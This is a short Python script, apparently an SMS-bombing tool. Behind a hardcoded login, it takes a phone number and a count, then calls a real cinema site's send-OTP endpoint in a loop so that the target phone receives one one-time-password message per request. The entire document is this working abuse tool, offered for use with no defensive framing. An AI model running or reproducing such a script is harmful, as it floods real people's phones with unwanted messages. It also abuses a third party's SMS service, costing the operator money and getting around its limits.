import requests
import argparse
import sys


biyellow="\033[1;93m"     # Yellow
red="\033[0;31m"          # Red
bicyan="\033[1;96m"       # Cyan
green="\033[0;32m"        # Green
blue="\033[0;34m"         # Blue


print(biyellow+"F@@reN@@")

uname = str(input(green+"Username: "))
pwd = input(green+"Password: ")

if uname == "farena" and pwd == "aws36":

	#GET
	number = str(input(blue+"Enter Number[+] "))
	api = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

	amount = int(input(blue+"Enter Amount[+] "))
	for i in range(amount):
		requests.get(api)
		print(bicyan+"SMS Sent: ", i + 1)
else:
	print(red+"LOL!! Enter Valid Username and Password....")
	sys.exit()
